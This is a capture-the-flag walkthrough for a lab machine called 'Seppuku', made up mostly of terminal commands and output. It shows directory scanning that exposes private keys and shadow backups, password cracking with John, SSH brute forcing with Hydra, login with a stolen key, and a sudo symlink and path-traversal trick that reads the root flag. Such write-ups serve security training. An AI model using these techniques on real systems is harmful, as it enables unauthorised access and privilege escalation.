@@ -1,0 +1,174 @@
+With dirb find http://192.168.1.29:7601/keys
+find private keys and downloaded them
+
+http://192.168.1.29:7601/secret/
+
+-rw-r--r-- 1 hack hack     8 mag 13 09:41 hostname
+-rw-r--r-- 1 hack hack 59655 set 12  2018 jack.jpg
+-rw-r--r-- 1 hack hack  2801 mag 13 09:47 passwd.bak
+-rw-r--r-- 1 hack hack   672 mag 13 09:59 password.lst
+-rwx------ 1 hack hack  1680 mag 13 11:28 private
+-rw-r--r-- 1 hack hack  1680 mag 27 18:35 private.bak
+-rw-r--r-- 1 hack hack  2524 mag 27 18:29 scan.txt
+-rw-r--r-- 1 hack hack  1448 mag 13 09:48 shadow.bak
+
+
+Use john the ripper to crack the password, but it's a rabbit hole...
+
+hack@kali:~/CTF/seppuku$ sudo john hashfile --wordlist= password.lst                                
+Using default input encoding: UTF-8                                                                 
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])                          
+Cost 1 (iteration count) is 5000 for all loaded hashes                                              
+Will run 3 OpenMP threads                                                                           
+Press 'q' or Ctrl-C to abort, almost any other key for status                                       
+a1b2c3           (r@bbit-hole)
+1g 0:00:00:00 DONE (2020-05-27 18:44) 3.703g/s 711.1p/s 711.1c/s 711.1C/s 123456..knight
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+
+Try bruteforce ssh with hydra and list of password and hostname in the file:
+
+hack@kali:~/CTF/seppuku$ hydra -L hostname -P password.lst ssh://192.168.1.29 -t 4
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-27 18:46:58
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 93 login tries (l:1/p:93), ~24 tries per task
+[DATA] attacking ssh://192.168.1.29:22/
+[STATUS] 40.00 tries/min, 40 tries in 00:01h, 53 to do in 00:02h, 4 active
+[STATUS] 32.00 tries/min, 64 tries in 00:02h, 29 to do in 00:01h, 4 active
+[22][ssh] host: 192.168.1.29   login: seppuku   password: eeyoree
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-27 18:49:28
+
+
+Find credentials and connect to seppuku:
+
+hack@kali:~/CTF/seppuku$ ssh seppuku@192.168.1.29
+seppuku@192.168.1.29's password: 
+Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 13 10:52:41 2020 from 192.168.1.48
+seppuku@seppuku:~$ 
+
+seppuku@seppuku:~$ cat .passwd 
+12345685213456!@!@A
+
+
+seppuku@seppuku:~$ sudo -l
+Matching Defaults entries for seppuku on seppuku:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User seppuku may run the following commands on seppuku:
+    (ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/
+
+Symbolic link to /root:
+seppuku@seppuku:~$ 
+seppuku@seppuku:~$ sudo /usr/bin/ln -sf /root/ /tmp/
+seppuku@seppuku:~$ 
+seppuku@seppuku:~$ ls -la /tmp
+total 40
+drwxrwxrwt 10 root   root    4096 May 27 13:02 .
+drwxr-xr-x 18 root   root    4096 May 13 00:25 ..
+drwxrwxrwt  2 root   root    4096 May 27 12:24 .font-unix
+drwxrwxrwt  2 root   root    4096 May 27 12:24 .ICE-unix
+drwxr-xr-x  3 nobody nogroup 4096 May 27 12:24 lshttpd
+lrwxrwxrwx  1 root   root       6 May 27 13:02 root -> /root/
+drwx------  3 root   root    4096 May 27 12:24 systemd-private-c52159e29f474676842383c159fac662-apache2.service-1J6mik
+drwx------  3 root   root    4096 May 27 12:24 systemd-private-c52159e29f474676842383c159fac662-systemd-timesyncd.service-lUoXdx
+drwxrwxrwt  2 root   root    4096 May 27 12:24 .Test-unix
+drwxrwxrwt  2 root   root    4096 May 27 12:24 .X11-unix
+drwxrwxrwt  2 root   root    4096 May 27 12:24 .XIM-unix
+
+
+Find 2 more users:
+From /etc/passwd
+samurai:x:1001:1002:,,,:/home/samurai:/bin/rbash
+tanto:x:1002:1003:,,,:/home/tanto:/bin/rbash
+
+Try to su on samurai with password found in .passwd
+seppuku@seppuku:~$ su -  samurai
+Password: 12345685213456!@!@A
+samurai@seppuku:~$ 
+
+samurai@seppuku:~$ sudo -l
+Matching Defaults entries for samurai on seppuku:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User samurai may run the following commands on seppuku:
+    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
+
+Interesting....
+
+
+Use private key found at start to log into tanto account:	
+hack@kali:~/CTF/seppuku$ ssh tanto@192.168.1.29 -i private                   
+Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64    
+                                                                             
+The programs included with the Debian GNU/Linux system are free software;    
+the exact distribution terms for each program are described in the           
+individual files in /usr/share/doc/*/copyright.                              
+                                                                             
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 13 10:53:17 2020 from 192.168.1.48
+tanto@seppuku:~$ 
+tanto@seppuku:~$ 
+tanto@seppuku:~$ id
+uid=1002(tanto) gid=1003(tanto) groups=1003(tanto)
+tanto@seppuku:~$ 
+
+Create a symbolic link for folder that samurai can use and ln to use cat cmd:
+tanto@seppuku:~$ mkdir .cgi_bin
+tanto@seppuku:~$ cd .cgi_bin/
+tanto@seppuku:~/.cgi_bin$ 
+tanto@seppuku:~/.cgi_bin$ ln -s /bin/cat bin
+tanto@seppuku:~/.cgi_bin$ ls -la
+total 8
+drwxr-xr-x 2 tanto tanto 4096 May 27 13:38 .
+drwxr-xr-x 6 tanto tanto 4096 May 27 13:38 ..
+lrwxrwxrwx 1 tanto tanto    8 May 27 13:38 bin -> /bin/cat
+tanto@seppuku:~/.cgi_bin$ 
+
+
+samurai@seppuku:~$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/root.txt
+{SunCSR_Seppuku_2020_X}
+
+
+
+
+We can use different cmd as symlic link to read flag:
+tanto@seppuku:~/.cgi_bin$ unlink bin 
+tanto@seppuku:~/.cgi_bin$ ln -s /bin/cp bin
+tanto@seppuku:~/.cgi_bin$ ls -la
+total 8
+drwxr-xr-x 2 tanto tanto 4096 May 27 13:41 .
+drwxr-xr-x 6 tanto tanto 4096 May 27 13:38 ..
+lrwxrwxrwx 1 tanto tanto    7 May 27 13:41 bin -> /bin/cp
+tanto@seppuku:~/.cgi_bin$ 
+
+
+
+samurai@seppuku:~$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/root.txt root.txt
+samurai@seppuku:~$ ls -la
+total 32
+drwxr-xr-x 3 samurai samurai 4096 May 27 13:42 .
+drwxr-xr-x 5 root    root    4096 May 13 04:50 ..
+-rw------- 1 samurai samurai   13 May 13 10:52 .bash_history
+-rw-r--r-- 1 samurai samurai  220 May 13 04:48 .bash_logout
+-rw-r--r-- 1 samurai samurai 3526 May 13 04:48 .bashrc
+drwx------ 3 samurai samurai 4096 May 13 04:53 .gnupg
+-rw-r--r-- 1 samurai samurai  807 May 13 04:48 .profile
+-rw-r--r-- 1 root    root      24 May 27 13:42 root.txt
+samurai@seppuku:~$ cat root.txt
+{SunCSR_Seppuku_2020_X}
+samurai@seppuku:~$ 
+
